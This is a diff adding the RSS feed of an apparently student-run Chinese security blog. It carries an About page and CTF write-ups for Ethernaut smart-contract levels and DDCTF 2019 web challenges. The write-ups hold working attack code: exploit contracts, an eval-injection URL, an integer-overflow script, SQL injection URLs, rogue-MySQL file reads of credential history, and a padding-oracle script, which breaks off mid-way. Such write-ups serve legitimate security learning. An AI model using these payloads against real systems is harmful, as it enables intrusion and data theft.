@@ -1,0 +1,3992 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>syang&#39;s blog on syang&#39;s blog</title>
+    <link>https://syang-ng.github.io/</link>
+    <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Wed, 04 Sep 2019 09:20:22 +0800</lastBuildDate>
+    <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>About Me</title>
+      <link>https://syang-ng.github.io/about/</link>
+      <pubDate>Wed, 04 Sep 2019 09:20:22 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/about/</guid>
+      <description>
+
+&lt;h1 id=&#34;me&#34;&gt;Me&lt;/h1&gt;
+
+&lt;p&gt;Sen Yang&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://fudan.edu.cn/2016/index.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Fudan University&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;ctf&#34;&gt;CTF&lt;/h2&gt;
+
+&lt;p&gt;ID: syang&lt;/p&gt;
+
+&lt;h2 id=&#34;education&#34;&gt;Education&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;2019 - present&lt;/strong&gt;, Fudan University (FDU)&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Master of Science in Cyberspace Security&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;2015 - 2019&lt;/strong&gt;, Fudan University (FDU)&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The School of Software Engineering&lt;/li&gt;
+&lt;li&gt;Bachelor of Engineering in Software Engineering&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;publications&#34;&gt;Publications&lt;/h2&gt;
+
+&lt;h3 id=&#34;app-in-the-middle-demystify-application-virtualization-in-android-and-its-security-threats&#34;&gt;App in the middle: Demystify Application Virtualization in Android and its Security Threats.&lt;/h3&gt;
+
+&lt;p&gt;Lei Zhang, Zhemin Yang, Yuyu He, Mingqi Li, &lt;strong&gt;Sen Yang&lt;/strong&gt;, Min Yang, Yuan Zhang, Zhiyun Qian.
+In Proceedings of the 2019 ACM International Conference on Measurement and Modeling of Computer Systems , SIGMETRICS&amp;rsquo;19, Phoenix, Arizona, USA, June 24-28, 2019.&lt;/p&gt;
+
+&lt;h3 id=&#34;how-you-get-shot-in-the-back-a-systematical-study-about-cryptojacking-in-the-real-world&#34;&gt;How You Get Shot in the Back: A Systematical Study about Cryptojacking in the Real World.&lt;/h3&gt;
+
+&lt;p&gt;Geng Hong, Zhemin Yang, &lt;strong&gt;Sen Yang&lt;/strong&gt;, Lei Zhang, Yuhong Nan, Zhibo Zhang, Min Yang, Yuan Zhang, Zhiyun Qian, Haixin Duan.
+In Proceedings of the 25th ACM Conference on Computer and Communications Security, CCS&amp;rsquo;18, Toronto, Canada, October 15-19, 2018.&lt;/p&gt;
+
+&lt;h2 id=&#34;contact-me&#34;&gt;Contact Me&lt;/h2&gt;
+
+&lt;p&gt;Github: &lt;a href=&#34;https://github.com/syang-ng&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/syang-ng&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Email: syang15 AT fudan.edu.cn&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Ethernaut 部分题解</title>
+      <link>https://syang-ng.github.io/2019/05/ethernaut-part-writeup/</link>
+      <pubDate>Mon, 27 May 2019 13:42:59 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/05/ethernaut-part-writeup/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;久违地想做智能合约的题目了，正好 Ethernaut 上还有几题没做的，就特地在博客里码一下~~&lt;/p&gt;
+
+&lt;h2 id=&#34;magicnumber&#34;&gt;MagicNumber&lt;/h2&gt;
+
+&lt;p&gt;手动构造智能合约，具体参考了 &lt;a href=&#34;https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这里需要明确的知识点如下：&lt;/p&gt;
+
+&lt;h3 id=&#34;合约-bytcode&#34;&gt;合约 bytcode&lt;/h3&gt;
+
+&lt;p&gt;简单说，合约 bytecode 可以分为如下三个部分：部署代码、合约代码、以及用于验证的 Auxdata，在合约创建时运行的是部署代码，在合约创建成功后，运行的是合约代码。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// 部署代码
+60606040523415600e57600080fd5b5b603680601c6000396000f300
+// 合约代码
+60606040525b600080fd00
+// Auxdata
+a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;本题的限制是，合约代码长度不能超过 10，而且函数必须返回 42，这就需要我们手动构造合约 bytecode。&lt;/p&gt;
+
+&lt;p&gt;合约代码部分构造如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;602a    // v: push1 0x2a (value is 42)
+6080    // p: push1 0x80 (memory slot is 0x80)
+52      // mstore
+6020    // s: push1 0x20 (value is 32 bytes in size)
+6080    // p: push1 0x80 (value was stored in slot 0x80)
+f3      // return
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;部署代码构建如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;600a    // s: push1 0x0a (10 bytes)
+600c    // f: push1 0x0c (current position of runtime opcodes)
+6000    // t: push1 0x00 (destination memory index 0)
+39      // CODECOPY
+600a    // s: push1 0x0a (runtime opcode length)
+6000    // p: push1 0x00 (access memory index 0)
+f3      // return to EVM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最终合约创建构造如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from web3 import Web3
+
+my_ipc = Web3.HTTPProvider(&amp;quot;https://ropsten.infura.io/v3/xxxxxxxxxxxxxxxxxxx&amp;quot;)
+assert my_ipc.isConnected()
+w3 = Web3(my_ipc)
+
+myaddress = &amp;quot;&amp;quot;
+myprivkey = &amp;quot;&amp;quot;
+
+def makeTransaction(args):
+    obj = {
+        &#39;gasPrice&#39;: Web3.toWei(1, &#39;gwei&#39;),
+        &#39;gas&#39;:300000,
+        &#39;value&#39;: int(0)
+    }
+    return {**obj, **args}
+
+def getNonce(address):
+    return w3.eth.getTransactionCount(Web3.toChecksumAddress(address))
+
+def main():
+    txns = makeTransaction({&#39;code&#39;: &#39;0x600a600c600039600a6000f3602a60805260206080f3&#39;, &#39;nonce&#39;: getNonce(myaddress)})
+    signedTransaction = w3.eth.account.signTransaction(txns, myprivkey)
+    w3.eth.sendRawTransaction(signedTransaction.rawTransaction)
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;alien-codex&#34;&gt;Alien Codex&lt;/h2&gt;
+
+&lt;p&gt;两个 trick，首先是 bypass 数组长度的限制：&lt;code&gt;assert(_firstContactMessage.length &amp;gt; 2**200);&lt;/code&gt;，其次是通过数组的越界写，对 owner 变量进行修改。&lt;/p&gt;
+
+&lt;p&gt;通过阅读 &lt;a href=&#34;https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html，可以发现参数的数组，其长度其实是在&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html，可以发现参数的数组，其长度其实是在&lt;/a&gt; transaction 中的 data 决定的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x1d3d4c0b                                                       // function signature
+0000000000000000000000000000000000000000000000000000000000000020 // offset
+1000000000000000000000000000000000000000000000000000000000000001 // length
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第二个考点是数组的越界写，类似 capturetheether 上的 mapping，我们需要控制向 codex 写的方式覆盖 owner 变量。首先第一步是调用 &lt;code&gt;retract()&lt;/code&gt; 函数让数组长度下溢。第二步时计算 owner 变量在数组中的位置，具体计算规则为 &lt;code&gt;2**256 - sha3(bytes(1))&lt;/code&gt;，得到 owner 对应 solt 0 的索引是 35707666377435648211887908874984608119992236509074197713628505308453184860938，调用 &lt;code&gt;revise&lt;/code&gt; 即可得到结果。&lt;/p&gt;
+
+&lt;h2 id=&#34;denail&#34;&gt;Denail&lt;/h2&gt;
+
+&lt;p&gt;题目的意思是禁止 owner 分走相应的余额，所以要求执行失败，本题的考点就是 Denail of Service.&lt;/p&gt;
+
+&lt;p&gt;很明显可以利用 assert 会消耗所有 gas 的特性来达成该条件（当然也可以考虑重入攻击）。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;contract DenialAttack {   
+    function() payable {
+        assert(0 == 1);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;shop&#34;&gt;Shop&lt;/h2&gt;
+
+&lt;p&gt;对 gas 的消耗有限制，所以不能通过 storage 变量的方式进行判断，但恰好 &lt;code&gt;isSold&lt;/code&gt; 恰好可以代替用于判断的 storage 变量，所以构造 payload 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;contract Attack is Buyer {
+    Shop public i;
+    
+    constructor(address _addr) public {
+        i = Shop(_addr);
+    }
+    
+    function price() view returns(uint) {
+        return i.isSold() ? 0 : 100;
+    }
+    
+    function hack() {
+        i.buy();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;
+
+&lt;p&gt;之前把前几题的解答投到先知上了 &lt;a href=&#34;https://xz.aliyun.com/t/2856&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;从 Ethernaut 看以太坊智能合约漏洞（一）&lt;/a&gt;，剩下的可以参考 &lt;a href=&#34;http://www.bendawang.site/2018/11/13/Zeppelin-ethernaut-writeup/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Zeppelin ethernaut writeup&lt;/a&gt; 或者 &lt;a href=&#34;http://mitah.cn/index.php/archives/14/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Zeppelin Ethernaut writeup&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;拖了半年才做完这些题目，好生颓废。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>DDCTF2019 Web 填坑</title>
+      <link>https://syang-ng.github.io/2019/04/ddctf2019-web/</link>
+      <pubDate>Thu, 25 Apr 2019 19:29:23 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/04/ddctf2019-web/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;DDCTF 2019 Web，特地记录一下当时没做的或者好玩的题目&lt;/p&gt;
+
+&lt;h2 id=&#34;homebrew-event-loop&#34;&gt;homebrew event loop&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://116.85.48.107:5002/d5af33f66147e857&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://116.85.48.107:5002/d5af33f66147e857&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;源码审计：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# -*- encoding: utf-8 -*- 
+# written in python 2.7 
+__author__ = &#39;garzon&#39; 
+
+from flask import Flask, session, request, Response 
+import urllib 
+
+app = Flask(__name__) 
+app.secret_key = &#39;*********************&#39; # censored 
+url_prefix = &#39;/d5af33f66147e857&#39; 
+
+def FLAG(): 
+    return &#39;FLAG_is_here_but_i_wont_show_you&#39;  # censored 
+     
+def trigger_event(event): 
+    session[&#39;log&#39;].append(event) 
+    if len(session[&#39;log&#39;]) &amp;gt; 5: session[&#39;log&#39;] = session[&#39;log&#39;][-5:] 
+    if type(event) == type([]): 
+        request.event_queue += event 
+    else: 
+        request.event_queue.append(event) 
+
+def get_mid_str(haystack, prefix, postfix=None): 
+    haystack = haystack[haystack.find(prefix)+len(prefix):] 
+    if postfix is not None: 
+        haystack = haystack[:haystack.find(postfix)] 
+    return haystack 
+     
+class RollBackException: pass 
+
+def execute_event_loop(): 
+    valid_event_chars = set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;) 
+    resp = None 
+    while len(request.event_queue) &amp;gt; 0: 
+        event = request.event_queue[0] # `event` is something like &amp;quot;action:ACTION;ARGS0#ARGS1#ARGS2......&amp;quot; 
+        request.event_queue = request.event_queue[1:] 
+        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)): continue 
+        for c in event: 
+            if c not in valid_event_chars: break 
+        else: 
+            is_action = event[0] == &#39;a&#39; 
+            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;) 
+            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;) 
+            try: 
+                event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;)) 
+                ret_val = event_handler(args) 
+            except RollBackException: 
+                if resp is None: resp = &#39;&#39; 
+                resp += &#39;ERROR! All transactions have been cancelled. &amp;lt;br /&amp;gt;&#39; 
+                resp += &#39;&amp;lt;a href=&amp;quot;./?action:view;index&amp;quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;] 
+                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;] 
+                break 
+            except Exception, e: 
+                if resp is None: resp = &#39;&#39; 
+                #resp += str(e) # only for debugging 
+                continue 
+            if ret_val is not None: 
+                if resp is None: resp = ret_val 
+                else: resp += ret_val 
+    if resp is None or resp == &#39;&#39;: resp = (&#39;404 NOT FOUND&#39;, 404) 
+    session.modified = True 
+    return resp 
+     
+@app.route(url_prefix+&#39;/&#39;) 
+def entry_point(): 
+    querystring = urllib.unquote(request.query_string) 
+    request.event_queue = [] 
+    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &amp;gt; 100: 
+        querystring = &#39;action:index;False#False&#39; 
+    if &#39;num_items&#39; not in session: 
+        session[&#39;num_items&#39;] = 0 
+        session[&#39;points&#39;] = 3 
+        session[&#39;log&#39;] = [] 
+    request.prev_session = dict(session) 
+    trigger_event(querystring) 
+    return execute_event_loop() 
+
+# handlers/functions below -------------------------------------- 
+
+def view_handler(args): 
+    page = args[0] 
+    html = &#39;&#39; 
+    html += &#39;[INFO] you have {} diamonds, {} points now.&amp;lt;br /&amp;gt;&#39;.format(session[&#39;num_items&#39;], session[&#39;points&#39;]) 
+    if page == &#39;index&#39;: 
+        html += &#39;&amp;lt;a href=&amp;quot;./?action:index;True%23False&amp;quot;&amp;gt;View source code&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+        html += &#39;&amp;lt;a href=&amp;quot;./?action:view;shop&amp;quot;&amp;gt;Go to e-shop&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+        html += &#39;&amp;lt;a href=&amp;quot;./?action:view;reset&amp;quot;&amp;gt;Reset&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+    elif page == &#39;shop&#39;: 
+        html += &#39;&amp;lt;a href=&amp;quot;./?action:buy;1&amp;quot;&amp;gt;Buy a diamond (1 point)&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+    elif page == &#39;reset&#39;: 
+        del session[&#39;num_items&#39;] 
+        html += &#39;Session reset.&amp;lt;br /&amp;gt;&#39; 
+    html += &#39;&amp;lt;a href=&amp;quot;./?action:view;index&amp;quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+    return html 
+
+def index_handler(args): 
+    bool_show_source = str(args[0]) 
+    bool_download_source = str(args[1]) 
+    if bool_show_source == &#39;True&#39;: 
+     
+        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;) 
+        html = &#39;&#39; 
+        if bool_download_source != &#39;True&#39;: 
+            html += &#39;&amp;lt;a href=&amp;quot;./?action:index;True%23True&amp;quot;&amp;gt;Download this .py file&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+            html += &#39;&amp;lt;a href=&amp;quot;./?action:view;index&amp;quot;&amp;gt;Go back to index.html&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt;&#39; 
+             
+        for line in source: 
+            if bool_download_source != &#39;True&#39;: 
+                html += line.replace(&#39;&amp;amp;&#39;,&#39;&amp;amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;amp;nbsp;&#39;).replace(&#39;&amp;lt;&#39;, &#39;&amp;amp;lt;&#39;).replace(&#39;&amp;gt;&#39;,&#39;&amp;amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&amp;lt;br /&amp;gt;&#39;) 
+            else: 
+                html += line 
+        source.close() 
+         
+        if bool_download_source == &#39;True&#39;: 
+            headers = {} 
+            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39; 
+            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39; 
+            return Response(html, headers=headers) 
+        else: 
+            return html 
+    else: 
+        trigger_event(&#39;action:view;index&#39;) 
+         
+def buy_handler(args): 
+    num_items = int(args[0]) 
+    if num_items &amp;lt;= 0: return &#39;invalid number({}) of diamonds to buy&amp;lt;br /&amp;gt;&#39;.format(args[0]) 
+    session[&#39;num_items&#39;] += num_items  
+    trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;]) 
+     
+def consume_point_function(args): 
+    point_to_consume = int(args[0]) 
+    if session[&#39;points&#39;] &amp;lt; point_to_consume: raise RollBackException() 
+    session[&#39;points&#39;] -= point_to_consume 
+     
+def show_flag_function(args): 
+    flag = args[0] 
+    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
+    return &#39;You naughty boy! ;) &amp;lt;br /&amp;gt;&#39; 
+     
+def get_flag_handler(args): 
+    if session[&#39;num_items&#39;] &amp;gt;= 5: 
+        trigger_event(&#39;func:show_flag;&#39; + FLAG()) # show_flag_function has been disabled, no worries 
+    trigger_event(&#39;action:view;index&#39;) 
+     
+if __name__ == &#39;__main__&#39;: 
+    app.run(debug=False, host=&#39;0.0.0.0&#39;) 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显 &lt;code&gt;event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))&lt;/code&gt; 处有明显漏洞，由于我们可以控制 &lt;code&gt;action&lt;/code&gt; 参数，所以可以在参数最后拼接 &lt;code&gt;#&lt;/code&gt; 注释代码进而代码执行。&lt;/p&gt;
+
+&lt;p&gt;最终 payload 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;1%23action:buy;3%23action:get_flag;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;虽然 &lt;code&gt;get_flag&lt;/code&gt; 没有回显，但由于程序会将相应的结果写入 &lt;code&gt;session[&#39;log&#39;]&lt;/code&gt;，所以可以通过解密 session 的方式获得 flag，对应的解密脚本地址：&lt;a href=&#34;https://github.com/noraj/flask-session-cookie-manager&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/noraj/flask-session-cookie-manager&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;大吉大利-今晚吃鸡&#34;&gt;大吉大利，今晚吃鸡&lt;/h2&gt;
+
+&lt;p&gt;Go 语言的整数溢出问题，最后需要编写脚本&lt;/p&gt;
+
+&lt;p&gt;问题在于 &lt;code&gt;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=2000&lt;/code&gt; 的 &lt;code&gt;ticket_price&lt;/code&gt; 可控，而当我们设置 &lt;code&gt;ticket_price&lt;/code&gt; 为 &lt;code&gt;2**32&lt;/code&gt; 时，可以发现购买成功。很明显后端在处理购买逻辑时将我们输入的价格作为有符号数进行处理，进而触发整数溢出问题（这里卡了很久，一直以为是 uint64 最后发现竟然是 uint32，批判一下自己，单纯懒得尝试就弃好久&lt;/p&gt;
+
+&lt;p&gt;最后写脚本，真·我杀我自己：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import json
+import requests
+
+basename = &#39;aabbcc&#39;
+baseUrl = &#39;http://117.51.147.155:5050/ctf/api/&#39;
+
+def register(s, q):
+    return s.get(baseUrl+&#39;register&#39;, params=q)
+
+def login(s, q):
+    return s.get(baseUrl+&#39;login&#39;, params=q)
+
+def buy_ticket(s):
+    res = s.get(baseUrl+&#39;buy_ticket&#39;, params={&amp;quot;ticket_price&amp;quot;: 2**32})
+    res = json.loads(res.text)
+    return res[&#39;data&#39;][0][&#39;bill_id&#39;]
+
+def pay_ticket(s, bill_id):
+    res = s.get(baseUrl+&#39;pay_ticket&#39;, params={&#39;bill_id&#39;: bill_id})
+    res = json.loads(res.text)
+    return {&#39;id&#39;: res[&#39;data&#39;][0][&#39;your_id&#39;], &#39;ticket&#39;: res[&#39;data&#39;][0][&#39;your_ticket&#39;]}
+
+def remove_robot(s, p):
+    return s.get(baseUrl+&#39;remove_robot&#39;, params=p)
+
+def getOneTicket(i):
+    s = requests.Session()
+    np = basename+str(i)
+    register(s, {&#39;name&#39;: np, &#39;password&#39;: np})
+    login(s, {&#39;name&#39;: np, &#39;password&#39;: np})
+    bill_id = buy_ticket(s)
+    return pay_ticket(s, bill_id)
+
+def getMain():
+    s = requests.Session()
+    np = basename+&#39;flag&#39;
+    #register(s, {&#39;name&#39;: np, &#39;password&#39;: np})
+    login(s, {&#39;name&#39;: np, &#39;password&#39;: np})
+    #bill_id = buy_ticket(s)
+    #pay_ticket(s, bill_id)
+    return s
+
+def main():
+    robots = []
+    s = getMain()
+    for i in range(750, 800):
+        robot = getOneTicket(i)
+        remove_robot(s, robot)
+        print(robot)
+    flag = s.get(baseUrl+&#39;get_flag&#39;).text
+    print(flag)
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;欢迎报名ddctf&#34;&gt;欢迎报名DDCTF&lt;/h2&gt;
+
+&lt;p&gt;以为是个注入，没想到是个 xss + 注入 (lll￢ω￢)，赛后看别人 writeup 做的&lt;/p&gt;
+
+&lt;p&gt;xss 读取源码，发现接口 &lt;code&gt;query_aIeMu0FUoVrW0NWPHbN6z4xh.php&lt;/code&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE_html&amp;gt;
+&amp;lt;html_lang=&amp;quot;en&amp;quot;&amp;gt;
+    &amp;lt;head&amp;gt; 
+        &amp;lt;meta_charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+        &amp;lt;!--每隔30秒自动刷新--&amp;gt;
+        &amp;lt;meta_http-equiv=&amp;quot;refresh&amp;quot;_content=&amp;quot;30&amp;quot;&amp;gt;
+        &amp;lt;title&amp;gt;DDCTF报名列表&amp;lt;/title&amp;gt;
+    &amp;lt;/head&amp;gt;
+    &amp;lt;body&amp;gt;
+        &amp;lt;table__align=&amp;quot;center&amp;quot;_&amp;gt;
+            &amp;lt;thead&amp;gt;
+                &amp;lt;tr&amp;gt;
+                    &amp;lt;th&amp;gt;姓名&amp;lt;/th&amp;gt; 
+                    &amp;lt;th&amp;gt;昵称&amp;lt;/th&amp;gt;
+                    &amp;lt;th&amp;gt;备注&amp;lt;/th&amp;gt;
+                    &amp;lt;th&amp;gt;时间&amp;lt;/th&amp;gt;
+                &amp;lt;/tr&amp;gt;
+            &amp;lt;/thead&amp;gt;
+            &amp;lt;tbody&amp;gt;
+                &amp;lt;!--_列表循环展示_--&amp;gt;
+                &amp;lt;tr&amp;gt;
+                    &amp;lt;td&amp;gt;&amp;lt;a_target=&amp;quot;_blank&amp;quot;__href=&amp;quot;index_php&amp;quot;&amp;gt;报名&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
+                &amp;lt;/tr&amp;gt;
+                &amp;lt;!--_&amp;lt;a_target=&amp;quot;_blank&amp;quot;__href=&amp;quot;query_aIeMu0FUoVrW0NWPHbN6z4xh_php&amp;quot;&amp;gt;_接口_&amp;lt;/a&amp;gt;--&amp;gt;
+            &amp;lt;/tbody&amp;gt;
+        &amp;lt;/table&amp;gt;
+    &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注入：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# database: ctfdb
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27or%201%20union%20select%201,group_concat(schema_name),3,4,5%20from%20information_schema.schemata%23
+# table: ctf_fhmHRPL5
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27union+select+1,TABLE_NAME,2,3,4%20FROM%20information_schema.tables%20WHERE%20TABLE_SCHEMA=0x6374666462;%23
+# column: ctf_value
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27UNION+SELECT+1,+GROUP_CONCAT(column_name),2,3,4+FROM+information_schema.columns+WHERE+table_name=0x6374665f66686d4852504c35;%23
+# flag: DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27UNION+SELECT+1,+ctf_value,2,3,4+FROM+ctfdb.ctf_fhmHRPL5;%23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;mysql弱口令&#34;&gt;mysql弱口令&lt;/h2&gt;
+
+&lt;p&gt;主要考点就是通过 MySQL LOAD DATA 的特性进行任意文件的读取，直接部署 &lt;a href=&#34;https://github.com/allyshka/Rogue-MySql-Server&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/allyshka/Rogue-MySql-Server&lt;/a&gt; 上的脚本进行文件读取即可。&lt;/p&gt;
+
+&lt;p&gt;正常的思路是：&lt;code&gt;读取源码&lt;/code&gt; =&amp;gt; &lt;code&gt;读取数据库信息&lt;/code&gt; =&amp;gt; &lt;code&gt;读取数据库文件&lt;/code&gt; =&amp;gt; &lt;code&gt;获得 flag&lt;/code&gt;，可以发现 flag 在 &lt;code&gt;/var/lib/mysql/security/flag.ibd&lt;/code&gt; 文件中。&lt;/p&gt;
+
+&lt;p&gt;还有一种思路则是直接读取 &lt;code&gt;/root/.mysql_history&lt;/code&gt;，由于 mysql 进行操作的时候会将 log 写入相应的记录文件中，所以可以直接从 log 文件中读取相应的 flag。&lt;/p&gt;
+
+&lt;h2 id=&#34;再来1杯java&#34;&gt;再来1杯Java&lt;/h2&gt;
+
+&lt;p&gt;愉快的学习 java web 之路。。&lt;/p&gt;
+
+&lt;p&gt;padding oracle：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import base64
+import binascii
+
+url = &amp;quot;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token&amp;quot;
+base_token = base64.b64decode(&amp;quot;UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF&amp;quot;)
+result = &#39;&#39;
+
+for index in range(2):
+    encrypt = base_token[16*(index+1):16*(index+2)]
+    prev = base_token[:16*index]
+    c_iv = base_token[16*index:16*(index+1)]
+    mid_value = 0
+    for i in range(1, 17):
+        for j in range(256):
+            if mid_value:
+                padding =  hex(mid_value ^ int(binascii.hexlify(chr(i)*(i-1)), 16)).strip(&#39;L&#39;)[2::]
+                if len(padding) % 2:
+                    padding = &#39;0&#39;+padding 
+                token = &#39;{}{}{}{}{}&#39;.format(prev, chr(0)*(16-i), chr(j), binascii.unhexlify(padding), encrypt)
+            else:
+                token = &#39;{}{}{}{}&#39;.format(prev, chr(0)*(16-i), chr(j), encrypt)
+            
+            headers = {
+                &#39;Cookie&#39;: &amp;quot;token=&amp;quot;+base64.b64encode(token)
+            }
+            response = requests.get(url, headers=headers)
+            if response.text.strip() != &amp;quot;decrypt err~&amp;quot;:
+                mid_value += ((i ^ j) &amp;lt;&amp;lt; (8*(i-1)))
+                print(hex(mid_value))
+                break
+    
+    mid_value = hex(mid_value).strip(&#39;L&#39;)[2::]
+    if len(mid_value) % 2:
+        mid_value = &#39;0&#39; + mid_value
+
